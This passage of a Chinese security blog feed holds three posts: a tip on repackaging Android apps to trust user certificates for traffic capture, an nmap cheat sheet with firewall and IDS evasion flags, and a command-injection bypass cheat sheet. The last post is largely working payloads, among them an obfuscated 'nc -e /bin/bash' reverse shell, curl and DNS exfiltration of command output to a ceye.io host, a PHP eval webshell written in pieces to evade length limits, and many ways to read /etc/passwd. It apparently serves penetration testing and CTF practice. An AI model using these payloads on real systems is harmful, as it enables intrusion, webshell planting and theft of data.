title="补充"></a>补充</h2><p>其实除了上面的方法，还有其他的很多思路，下面仅作记录，方便以后查阅：<br>1、有网友提出另一种抓包方式抓取微信PC端的流量，类似内网渗透中代理内网流量，在SocksCap64中设置代理服务器为burp的地址和端口，代理方式HTTP.然后设置微信走socksCap64代理。通过burpsuite抓包即可。—这种思路某些情况下没能成功23333.</p><p>2、将apk解包,通过控制app的证书信任机制再重打包安装进行抓包：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">在res/xml/network_security_config.xml中加入：</span><br><span class="line">&lt;network-security-config&gt; </span><br><span class="line">  &lt;debug-overrides&gt; </span><br><span class="line">    &lt;trust-anchors&gt; </span><br><span class="line">      &lt;!-- Trust user added CAs while debuggable only --&gt;</span><br><span class="line">      &lt;certificates src=&quot;user&quot; /&gt; </span><br><span class="line">    &lt;/trust-anchors&gt; </span><br><span class="line">  &lt;/debug-overrides&gt; </span><br><span class="line">&lt;/network-security-config&gt;</span><br></pre></td></tr></table></figure></p><p>然后在app的manifest文件中引入上面的文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;manifest ... &gt;</span><br><span class="line">    &lt;application android:networkSecurityConfig=&quot;@xml/network_security_config&quot; ... &gt;</span><br><span class="line">        ...</span><br><span class="line">    &lt;/application&gt;</span><br><span class="line">&lt;/manifest&gt;</span><br></pre></td></tr></table></figure></p><p>这里有个前提，重打包过程ok。不然坑很多。</p><p>3、对不走代理的app就只能借助手机中Http Catcher这类软件了。可对多种软件进行抓包。自行下载：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0paLURhcmthbC9BbmRyb2lkSHR0cENhcHR1cmUvcmVsZWFzZXM=" title="https://github.com/JZ-Darkal/AndroidHttpCapture/releases">https://github.com/JZ-Darkal/AndroidHttpCapture/releases<i class="fa fa-external-link"></i></span></p><p>4、对于微信小程序抓包，也可以安装微信电脑测试版，可以支持打开小程序，用fiddler就可以直接抓包。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;无论&lt;/strong&gt;是日常渗透测试还是在做红蓝对抗，或者甲方自查风险，手机端的暴露面都是不可忽视的一部分
    
    </summary>
    
      <category term="终端安全" scheme="http://sunu11.com/categories/%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="app攻防" scheme="http://sunu11.com/tags/app%E6%94%BB%E9%98%B2/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试利器--nmap</title>
    <link href="http://sunu11.com/2019/03/14/nmap/"/>
    <id>http://sunu11.com/2019/03/14/nmap/</id>
    <published>2019-03-14T12:12:56.000Z</published>
    <updated>2019-05-30T07:33:29.229Z</updated>
    
    <content type="html"><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>Nmap Free Security Scanner, Port Scanner, &amp; Network Exploration Tool. Download open source software for Linux, Windows, UNIX, FreeBSD, etc.</p><p><strong>本文主要用以总结nmap使用技巧与探测方法</strong></p><h3 id="主要参数以及扫描方式："><a href="#主要参数以及扫描方式：" class="headerlink" title="主要参数以及扫描方式："></a>主要参数以及扫描方式：<a id="more"></a></h3><p>1 Tcp SYN Scan (sS) 这是一个基本的扫描方式,它被称为半开放扫描。Nmap发送SYN包到远程主机，它不会产生任何会话.不需要通过完整的握手，就能获得远程主机的信息。因此不会在目标主机上产生任何日志记录。<br>Nmap命令中没有指出扫描类型,默认的就是Tcp SYN.需要root/administrator权限.<br><code>nmap -sS 192.168.1.0/24</code><br>进行秘密SYN扫描，对象为主机Saznme所在的“C类”网段 的255台主机。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS 192.168.1.0/24</span><br><span class="line">You requested a scan type which requires root privileges.</span><br><span class="line">QUITTING!</span><br><span class="line"></span><br><span class="line">~                                                                                                                                  ⍉</span><br><span class="line">▶ sudo nmap -sS 192.168.1.0/24</span><br><span class="line">Password:</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-14 20:49 CST</span><br></pre></td></tr></table></figure><p>2 Tcp connect() scan(sT)如果不选择SYN扫描,TCP connect()扫描就是默认的扫描模式.<br>不同于Tcp SYN扫描,Tcp connect()扫描需要完成三次握手,并且要求底层的操作系统通过发出连接系统调用来建立与目标机和端口的连接。<br><code>nmap -sT 192.168.1.0/24</code></p><p>3 Udp scan(sU) UDP扫描发送UDP数据包到目标主机，并等待响应,如果返回ICMP不可达的错误消息，说明端口是关闭的，如果得到正确的适当的回应，说明端口是开放的.<br>UDP扫描用-sU选项,UDP扫描发送空的(没有数据)UDP报头到每个目标端口:<br><code>nmap -sU 192.168.1.0/24</code><br>使用UDP ping探测主机：<br><code>nmap -PU 192.168.1.0/24</code></p><p>4 FINscan(sF)有时候TcpSYN扫描不是最佳的扫描模式,因为有防火墙的存在.目标主机有时候可能有IDS和IPS系统的存在,防火墙会阻止掉SYN数据包。<br>发送一个设置了FIN标志的数据包并不需要完成TCP的握手.FIN扫描也不会在目标主机上创建日志</p><p>5 PING扫描不同于其它的扫描方式，因为它只用于找出主机是否是存在在网络中的.它不是用来发现是否开放端口的.PING扫描需要ROOT权限，如果用户没有ROOT权限,PING扫描将会使用connect()调用.<br>nmap -Pn 192.168.1.0/24 （不进行ping，突破防火墙）<br>-PA　TCP Ack Ping 扫描。<br>-PY 包含一个最小的INIT块的SCTP包 找到使用流控制传输协议（SCTP）主机。<br>-PE 将对指定主机执行ICMP（互联网控制消息协议）回显Ping<br>-PP 执行一次ICMP时间戳ping。<br>-PM 进行ICMP 地址掩码 ping.<br>-PO 执行IP协议Ping扫描<br>-PR 选项指示的Nmap对指定目标执行ARP（地址解析协议）ping操作<br>-Pn ～～不进行ping主机～～不进行主机存活发现（ps:nmap使用四种技术进行主机存活发现（icmp echo request、TCP SYN 、TCP ACK、ICMP timestamp request—-多谢香君、东城师父）<br>-PS TCP SYN Ping 扫描</p><p>6 Idlescan(sL)Idlescan是一种先进的扫描技术，它不是用你真实的主机Ip发送数据包，而是使用另外一个目标网络的主机发送数据包<br>仅列出指定网络上的每台主机，不发送任何报文到目标主机：<br>nmap -sL 192.168.1.0/24</p><p>7 版本检测(sV)版本检测是用来扫描目标主机和端口上运行的软件的版本.它不同于其它的扫描技术，它不是用来扫描目标主机上开放的端口，不过它需要从开放的端口获取信息来判断软件的版本.<br>使用版本检测扫描之前需要先用TCPSYN扫描开放了哪些端口.</p><p>8 Nmap的OS检测（O）(“-osscan-guess”)Nmap最重要的特点之一是能够远程检测操作系统和软件，Nmap的OS检测技术在渗透测试中用来了解远程主机的操作系统和软件是非常有用的，通过获取的信息你可以知道已知的漏洞。Nmap有一个名为的nmap-OS-DB数据库，该数据库包含超过2600操作系统的信息。Nmap把TCP和UDP数据包发送到目标机器上，然后检查结果和数据库对照。Nmap的操作系统指纹识别技术：设备类型（路由器，工作组等）运行（运行的操作系统）操作系统的详细信息（操作系统的名称和版本）网络距离（目标和攻击者之间的距离跳）如果远程主机有防火墙，IDS和IPS系统，你可以使用-Pn命令来确保不ping远程主机，因为有时候防火墙会组织掉ping请求.<br>nmap -O -Pn X.X.X.X</p><p>9 SCTP INIT扫描<br>SCTP（Stream Control Transmission Protocol，流控制传输协议）是IETF（Internet Engineering Task Force，因特网工程任务组）在2000年定义的一个传输层（Transport Layer）协议。SCTP可以看作是TCP协议的改进，它改进了TCP的一些不足，SCTP INIT Ping扫描通过向目标发送INIT包，根据目标主机的相应判断目标主机是否存活。<br><code>nmap -PY -v 192.168.1.1</code></p><p>其他参数：<br>-sX： XmasTree scan  设置FIN，PSH，URG和标志。<br>-sN： Null 扫描模式,不设置任何位（TCP标志标头是0）。<br><code>用于逃脱一些防火墙和包过滤软件能够对发送到被限制端口的SYN数据包进行的监视</code><br>-sF:  FIN扫描 设置只是TCP FIN位。<br>–sA: TCP ACK 扫描 没有判断端口的开放情况。它是用来绘制出防火墙规则，对哪些端口进行了保护。<br>-S ip: 伪装源ip进行扫描，需要使用使用–e指定网卡并且使用-Pn参数<br>-scanflag 自定义扫描类型 通过指定任意TCP标志来设计自己的扫描<br><code>nmap -e 目标网卡 目标ip -S 伪装ip -Pn</code><br>nmap -iflist：查看本地路由与接口<br>-b <ftp relay="" host=""> 使用FTP bounce scan扫描方式  </ftp></p><p>nmap常用扫描方式：<br>ping扫描（-sP)<br>nmap -sP target ping 扫描，检测存活性。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">▶ nmap -sP 192.168.1.0/24</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-14 20:44 CST</span><br><span class="line">Nmap scan report for 192.168.1.1</span><br><span class="line">Host is up (0.024s latency).</span><br><span class="line">Nmap scan report for 192.168.1.100</span><br><span class="line">Host is up (0.029s latency).</span><br><span class="line">Nmap scan report for 192.168.1.103</span><br><span class="line">Host is up (0.010s latency).</span><br><span class="line">Nmap scan report for 192.168.1.112</span><br><span class="line">Host is up (0.0018s latency).</span><br><span class="line">Nmap scan report for 192.168.1.119</span><br><span class="line">Host is up (0.041s latency).</span><br><span class="line">Nmap done: 256 IP addresses (5 hosts up) scanned in 9.53 seconds</span><br></pre></td></tr></table></figure></p><p>同时可以使用CIDR表示整个子网，可以使用-exclude 排除单个ip<br>扫描txt文件内的主机：<br>nmap -iL txt  需要txt与nmap在同一个目录下</p><ul><li>traceroute 可被用于跟踪的网络路径指定的主机<br>-r 指示的Nmap始终执行对目标IP地址的反向DNS解析。-r在对一个IP段进行侦查时非常有用，Nmap将尝试查询每个ip地址的反向DNS信息<br>-n 用于禁用反向DNS解析<br>-system-dns 指示NMAP使用主机系统自带的DNS解析器，而不是其自身内部的方法<br>-dns-servers 用于扫描时手动指定DNS服务器进行查询。<br>使用znmap可方便记住命令。<br>nmap -A 192.168.1.19 (执行路由跟踪等)<br>另外，nmap官方文档中的例子：<br>nmap -v ip/domain<br>这个选项扫描主机scanme中所有的保留TCP端口。选项-v启用细节模式。<br>nmap -sS -O ip/24<br>确定目标机支持哪些IP协议 (TCP，ICMP，IGMP等):<br>nmap -sO 192.168.1.19</li></ul><h3 id="nmap脚本使用："><a href="#nmap脚本使用：" class="headerlink" title="nmap脚本使用："></a>nmap脚本使用：</h3><p>1、增加脚本：<br>首先可以将写好或者收集好的脚本置于<code>$ Nmap_DATA/nselib/data/</code>文件夹中然后执行<code>Nmap -script-updatedb</code>命令更新数据库即可使用脚本<br>2、本地脚本分类与说明：<br>auth: 负责处理鉴权证书（绕开鉴权）的脚本<br>broadcast: 在局域网内探查更多服务开启状况，如dhcp/dns/sqlserver等服务<br>brute: 提供暴力破解方式，针对常见的应用如http/snmp等<br>default: 使用-sC或-A选项扫描时候默认的脚本，提供基本脚本扫描能力<br>discovery: 对网络进行更多的信息，如SMB枚举、SNMP查询等<br>dos: 用于进行拒绝服务攻击<br>exploit: 利用已知的漏洞入侵系统<br>external: 利用第三方的数据库或资源，例如进行whois解析<br>fuzzer: 模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞 intrusive: 入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏蔽<br>malware: 探测目标机是否感染了病毒、开启了后门等信息<br>safe: 此类与intrusive相反，属于安全性脚本<br>version: 负责增强服务与版本扫描（Version Detection）功能的脚本<br>vuln: 负责检查目标机是否有常见的漏洞（Vulnerability），如是否有MS08_067<br>3、脚本编写：</p><h3 id="经验与bypass技巧："><a href="#经验与bypass技巧：" class="headerlink" title="经验与bypass技巧："></a>经验与bypass技巧：</h3><p>一般ids不会记录sS扫描方式，但是默认的sT一般会被察觉。<br>使用nmap -f host </p><h3 id="其他："><a href="#其他：" class="headerlink" title="其他："></a>其他：</h3><p>1、NMAP时间设置：<br>Nmap  -T [0-5]目标<br><code>0:最缓慢的&lt;bypass waf or ids&gt; ------&gt; 4/5:加速扫描、最快速度扫描</code><br>2、扫描的并发设置以及主机分组设置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Nmap  -min-parallelism [数量] [目标]    并发端口扫描的最小数量</span><br><span class="line">Nmap  -max-parallelism [数量] [目标]    最大数量</span><br><span class="line">Nmap  -max-hostgroup [数目] [目标] 并发扫描主机数的最大值</span><br><span class="line">Nmap  -min-hostgroup [数目] [目标] 并发扫描主机数的最小值</span><br></pre></td></tr></table></figure></p><p>3、RTT超时设置<br><code>Nmap -initial-rtt-timeout [时间] [目标] 控制网络响应初始超时</code><br><code>Nmap -max-rtt-timeout [时间] [目标] 指定最大RTT数据包响应超时，对于扫描大块地址可适当提高以防止nmap断开</code><br>4、TTL设置<br><code>Nmap -ttl [时间] [目标]: TTL用于指定扫描中的TTL值</code><br>5、其他：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Nmap -max-retries [数目] [目标]: 每个探针的最大重传次数</span><br><span class="line">Nmap -scan-delay [时间] [目标]: 指定扫描延迟指示的Nmap在发送探针之间的指定的最小时间间隔是多久</span><br><span class="line">Nmap -host-timeout [时间] [目标]：指定Nmap在超时多少时间后放弃对主机的扫描</span><br><span class="line">Nmap -max-scan-delay [时间] [目标]：Nmap在发送探针之间的指定的最大时间间隔是多久。</span><br><span class="line">Nmap -min-rate [数量] [目标]：Nmap每秒钟发送的数据包数量最小是多少。</span><br><span class="line">Nmap -max-rate [数量] [目标]：Nmap每秒钟发送的数据包数量最大是多少</span><br><span class="line">Nmap -defeat-rst-ratelimit [目标]：在目标通过发送RST包来限制扫描速率的情况下非常有用，它可以加快扫描速度，然而会影响结果的准确度。</span><br></pre></td></tr></table></figure></p><p>小技巧：<br>1、mac下建议扫描端口前加上sudo，有可能由于权限问题无法深入检测端口。<br>2、扫描过程中加上-n 可禁止反向dns解析，增加速度<br>3、使用–packet-trace 进行数据包跟踪。<br>未完待续</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>官方书籍： <span class="exturl" data-url="aHR0cHM6Ly9ubWFwLm9yZy9ib29rL2ludHJvLmh0bWw=" title="https://nmap.org/book/intro.html">https://nmap.org/book/intro.html<i class="fa fa-external-link"></i></span><br>Nmap备忘单：<span class="exturl" data-url="aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vc2VjdG9vbC8xMDEzMzUuaHRtbA==" title="https://www.freebuf.com/sectool/101335.html">https://www.freebuf.com/sectool/101335.html<i class="fa fa-external-link"></i></span><br>脚本开发：<span class="exturl" data-url="aHR0cDovL3d3dy5mcmVlYnVmLmNvbS9zZWN0b29sLzE3NzMwMC5odG1s" title="http://www.freebuf.com/sectool/177300.html">http://www.freebuf.com/sectool/177300.html<i class="fa fa-external-link"></i></span></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h3&gt;&lt;p&gt;Nmap Free Security Scanner, Port Scanner, &amp;amp; Network Exploration Tool. Download open source software for Linux, Windows, UNIX, FreeBSD, etc.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;本文主要用以总结nmap使用技巧与探测方法&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&quot;主要参数以及扫描方式：&quot;&gt;&lt;a href=&quot;#主要参数以及扫描方式：&quot; class=&quot;headerlink&quot; title=&quot;主要参数以及扫描方式：&quot;&gt;&lt;/a&gt;主要参数以及扫描方式：
    
    </summary>
    
      <category term="渗透测试" scheme="http://sunu11.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="内网渗透" scheme="http://sunu11.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="信息收集" scheme="http://sunu11.com/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
      <category term="端口探测" scheme="http://sunu11.com/tags/%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B/"/>
    
  </entry>
  
  <entry>
    <title>命令执行的一些总结与tips</title>
    <link href="http://sunu11.com/2019/01/15/Command%20execution%20summary%20and%20tips/"/>
    <id>http://sunu11.com/2019/01/15/Command execution summary and tips/</id>
    <published>2019-01-15T03:13:35.000Z</published>
    <updated>2019-04-29T14:24:21.570Z</updated>
    
    <content type="html"><![CDATA[<p>之前有做过一些笔记，加上需要做了一些题，综合网上的一些姿势总结一下：<a id="more"></a></p><h3 id="命令执行的函数："><a href="#命令执行的函数：" class="headerlink" title="命令执行的函数："></a>命令执行的函数：</h3><p><code>**php**: system()、shell_exec()、exec()、passthru()、popen()、proc_open()、pcntl_exec()，dl()</code><br><code>**python**: eval()、os.system（）、os.Popen（）、subprocess.Popen（）、subprocess.call(xx，shell=True)、commands.getstatus/output（）</code><br><code>**java**: 存在Runtime类，在该类中提供了exec方法用以在单独的进程中执行特定的字符串命令</code><br><code>**other**: ImageMagick组件等漏洞、bash漏洞、struts2系列、tp命令执行等</code></p><h3 id="绕过技巧："><a href="#绕过技巧：" class="headerlink" title="绕过技巧："></a>绕过技巧：</h3><p>1、命令分隔符：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%0a、%0d    换行符与回车符（php环境）</span><br><span class="line">|           第一条命令结果作为第二条命令的输入(eg.:ls|&gt;./a.txt)</span><br><span class="line">||          第一条执行失败，执行第二条命令（eg.:xx||ls)</span><br><span class="line">;           连续指令功能。</span><br><span class="line">&amp;           连接的两条命令都会执行</span><br><span class="line">&amp;&amp;          当第一条执行成功猜执行后续命令</span><br></pre></td></tr></table></figure></p><p>2、绕过空格:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;           重定向（eg.: cat&lt;flag.php)</span><br><span class="line">&lt;&gt;          重定向 （eg.: ls&lt;&gt;a.txt)</span><br><span class="line">$IFS$9      (Ubuntu下测试通过)后面加个$与&#123;&#125;类似，起截断作用，$9是当前系统shell进程第九个参数持有者，始终为空字符串，如cat$IFS2$9flag.php</span><br><span class="line">$&#123;IFS&#125;      （Ubuntu下测试通过)单纯cat$IFS2,IFS2被bash解释器当做变量名，输不出来结果，加一个&#123;&#125;就固定了变量名，如cat$&#123;IFS2&#125;flag.php</span><br><span class="line">%09         php环境下可替代空格。php7.1 测试失败。</span><br><span class="line">$IFS        ubuntu测试通过</span><br></pre></td></tr></table></figure><p>3、命令结束符号：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%00  --  需要php环境</span><br><span class="line">%20#  --  需要php环境</span><br></pre></td></tr></table></figure></p><p>4、黑名单绕过<br>1）通配符利用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">???/??t /???/p??s??                   ==&gt;       /bin/cat /etc/passwd</span><br><span class="line">/???/n? -e /???/b??h 2130706433 1337  ==&gt;       nc -e /bin/bash 127.0.0.1 1337</span><br></pre></td></tr></table></figure></p><p>2）夹杂字符：<br><code>1、单引号or双引号： cat /etc/passwd     ==&gt; cat /e&#39;&#39;t&#39;&#39;c/p&#39;&#39;a&#39;ss&#39;&#39;w&#39;&#39;d&#39; OR ca&#39;&#39;t x&quot;&quot;.php</code><br><code>2、空字符： Cat /etc/passwd     ==&gt; cat$u /etc$u/passwd$u</code><br><code>或者ca$1t /et$1c/passwd$u：($后仅能为数字)</code>3、反斜杠\:    l\s`</p><p>3）字符串拼接：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=c;b=at;c=flag;$a$b $c</span><br><span class="line">a=c;b=at;c=heb;d=ic;ab&#123;c&#125;&#123;d&#125;</span><br></pre></td></tr></table></figure></p><p>4)从文件中获取拼接：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">expr substr $(awk NR==1 test.php) 1 1（e.g：如下图）</span><br></pre></td></tr></table></figure></p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/os-1.png" alt="os-1"></p><p>5）编码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">对php而言，可进行进制/字符转换：编码为8进制or 16进制，或者其他方式编码(Unicode)等</span><br><span class="line">采用base64编码也可以绕过waf关键字（一般可被检测）eg.</span><br><span class="line">echo &quot;d2hvYW1p&quot;|base64 -d</span><br><span class="line">curl http://9sk1fm.ceye.io/$(id|base64)</span><br><span class="line">for l in `ls /root|base64 -w 100`; do curl http://127.0.0.1:9090/abr/$l; done;</span><br></pre></td></tr></table></figure></p><p>6)反引号<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaa`whoami`;`ls`</span><br></pre></td></tr></table></figure></p><p>7)ip中.绕过：<br>将地址替换为数字地址：如127.0.0.1可以转化为2130706433（10进制or16进制0x7F000001）。<br>在线地址：<span class="exturl" data-url="aHR0cDovL3d3dy5tc3hpbmRsLmNvbS90b29scy9pcC9pcF9udW0uYXNw" title="http://www.msxindl.com/tools/ip/ip_num.asp">http://www.msxindl.com/tools/ip/ip_num.asp<i class="fa fa-external-link"></i></span></p><p>8）无回显：<br>vps监听端口，发curl请求(or:ceye.io)<br>若curl、wget等命令被禁用，可通过ping vps ip 然后使用<code>netstat -s -p icmp</code>查看变化<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/os-2.png" alt="os-2"></p><p>9）windows下使用bat方式运行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$command = &apos;dir &apos;.$_POST[&apos;dir&apos;];</span><br><span class="line">$escaped_command = escapeshellcmd($command);</span><br><span class="line">var_dump($escaped_command);</span><br><span class="line">file_put_contents(&apos;out.bat&apos;,$escaped_command);</span><br><span class="line">system(&apos;out.bat&apos;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">执行.bat文件的时候，利用%1a，可以绕过过滤执行命令.</span><br><span class="line">dir=../ %1a whoami</span><br></pre></td></tr></table></figure></p><p>2、<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for /F %x in (&apos;dir /b D:\&apos;) do ping -n 1 xxx.%x.xxx.ceye.io</span><br><span class="line"></span><br><span class="line">or. do start</span><br></pre></td></tr></table></figure></p><p>10)get_defined_functions(php环境)：<br>通过调用系统函数php -r ‘print_r(get_defined_functions()[internal]);’<br>后面添加<code>[id](相应的命令)</code></p><p>11)长度限制的突破：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo &apos;&lt;?php&apos; &gt;1</span><br><span class="line">echo &apos;@eval(&apos; &gt;&gt;1</span><br><span class="line">echo &apos;$_POST[1]&apos; &gt;&gt;1</span><br><span class="line">echo &apos;); ?&gt;&apos; &gt;&gt;1</span><br></pre></td></tr></table></figure></p><p>或者参考文章： <span class="exturl" data-url="aHR0cDovL3doYy5kcm9wc2VjLnh5ei8yMDE3LzA1LzA4LyVFNyVCQiU5NSVFOCVCRiU4NzclRTQlQjglQUElRTUlQUQlOTclRTclQUMlQTZnZXRzaGVsbC/vvJo=" title="http://whc.dropsec.xyz/2017/05/08/%E7%BB%95%E8%BF%877%E4%B8%AA%E5%AD%97%E7%AC%A6getshell/：">http://whc.dropsec.xyz/2017/05/08/%E7%BB%95%E8%BF%877%E4%B8%AA%E5%AD%97%E7%AC%A6getshell/：<i class="fa fa-external-link"></i></span></p><p>12）巧用字符数组（php的webshell篇,本文不作过多描述，参考链接：<span class="exturl" data-url="aHR0cDovL3d3dy5jbmJsb2dzLmNvbS9MaXR0bGVoYW5uL3AvMzUyMjk5MC5odG1s77yJ" title="http://www.cnblogs.com/Littlehann/p/3522990.html）">http://www.cnblogs.com/Littlehann/p/3522990.html）<i class="fa fa-external-link"></i></span></p><h3 id="其他："><a href="#其他：" class="headerlink" title="其他："></a>其他：</h3><p>1、一个读文件内容的集合：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">file -f xxx --将显示在 FILE 列表中指定的每个文件的类型，间接可得到文件内容。</span><br><span class="line">zip -T --unzip-command &quot;sh -c id&quot; aa.zip aa.txt  </span><br><span class="line">cat--由第一行开始显示内容，并将所有内容输出</span><br><span class="line">tac--从最后一行倒序显示内容，并将所有内容输出</span><br><span class="line">more-- 根据窗口大小，一页一页的现实文件内容</span><br><span class="line">less 和more类似，但其优点可以往前翻页，而且进行可以搜索字符</span><br><span class="line">head-- 只显示头几行</span><br><span class="line">tail --只显示最后几行</span><br><span class="line">nl --类似于cat -n，显示时输出行号</span><br><span class="line">tailf-- 类似于tail -f</span><br><span class="line">vim --使用vim工具打开文本</span><br><span class="line">vi --使用vi打开文本cat 由第一行开始显示内容，并将所有内容输出</span><br><span class="line">strings  ---打印文件中的可打印字符串(strings /etc/passwd)</span><br><span class="line">curl file:///etc/passwd</span><br><span class="line">sort -- 从最后一行开始读取文件</span><br><span class="line">find -- 列出当前目录下的文件以及子目录所有文件</span><br><span class="line">find . -type f -exec curl sd1.d.net &#123;&#125; \; find 执行命令</span><br><span class="line">&amp;&#123;grep,-nrw,.&#125; -- 递归读取当前目录下的文件以及子目录所有文件</span><br><span class="line">grep -r .. -- 列出当前目录下的所有文件以及内容</span><br><span class="line">&#123;cat,/etc/passwd&#125;</span><br><span class="line">curl file:///etc/passwd</span><br><span class="line">strings /etc/passwd</span><br><span class="line">uniq -c/etc/passwd</span><br><span class="line">bash -v /etc/passwd</span><br><span class="line">rev /etc/passwd</span><br></pre></td></tr></table></figure><p>2、写文件名了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tee 只输出到标准输出</span><br></pre></td></tr></table></figure></p><p>2、一个开源os命令注入payload生成器FUzzing: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2V3aWxkZWQvc2hlbGxpbmc=" title="https://github.com/ewilded/shelling">https://github.com/ewilded/shelling<i class="fa fa-external-link"></i></span></p><p>3、参考链接：<br><span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC81ZTUwNWUzZDgwNzU=" title="https://www.jianshu.com/p/5e505e3d8075">https://www.jianshu.com/p/5e505e3d8075<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvODQ5MjA=" title="https://www.anquanke.com/post/id/84920">https://www.anquanke.com/post/id/84920<i class="fa fa-external-link"></i></span></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;之前有做过一些笔记，加上需要做了一些题，综合网上的一些姿势总结一下：
    
    </summary>
    
      <category term="WEB安全" scheme="http://sunu11.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
